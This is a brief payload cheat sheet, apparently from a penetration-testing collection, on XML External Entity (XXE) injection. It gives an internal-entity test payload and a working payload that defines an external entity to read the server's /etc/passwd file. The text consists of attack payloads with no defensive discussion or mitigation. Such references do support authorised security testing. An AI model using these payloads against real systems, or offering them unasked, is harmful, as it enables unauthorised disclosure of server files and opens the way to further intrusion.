# XXE Injection (XML External Entity)

## Testing for XXE
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example "Cappucino"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```
## Retrieve local server file
```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
<root>&test;</root>
```
